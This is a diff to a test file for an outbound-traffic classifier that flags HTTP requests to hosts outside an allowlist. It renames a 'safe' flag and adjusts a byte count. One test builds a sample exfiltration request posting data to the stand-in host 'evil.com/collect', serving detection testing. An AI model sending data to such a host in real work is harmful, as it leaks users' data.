@@ -6,19 +6,19 @@ def test_post_to_external_host_is_egress():
     adapter = HttpAdapter(allowed_hosts={"api.internal"})
     req = HttpRequest("POST", "https://evil.com/collect", body="hello")
     delta = simdiff(req, adapter)
-    assert delta.safe is True
+    assert delta.fully_classified is True
     assert len(delta.value_moves) == 1
     vm = delta.value_moves[0]
     assert vm.asset == "bytes"
     assert vm.dst == "evil.com"
-    assert vm.amount == 5
+    assert vm.amount == 13  # 5 body + len("/collect") path
 
 
 def test_egress_to_allowed_host_is_benign():
     adapter = HttpAdapter(allowed_hosts={"api.internal"})
     req = HttpRequest("POST", "https://api.internal/v1/log", body="event=ok")
     delta = simdiff(req, adapter)
-    assert delta.safe is True
+    assert delta.fully_classified is True
     assert delta.value_moves == []
 
 
@@ -49,5 +49,5 @@ def test_unparseable_url_is_fail_closed():
     adapter = HttpAdapter(allowed_hosts=set())
     req = HttpRequest("POST", "not a url", body="x")
     delta = simdiff(req, adapter)
-    assert delta.safe is False
+    assert delta.fully_classified is False
     assert delta.unknown
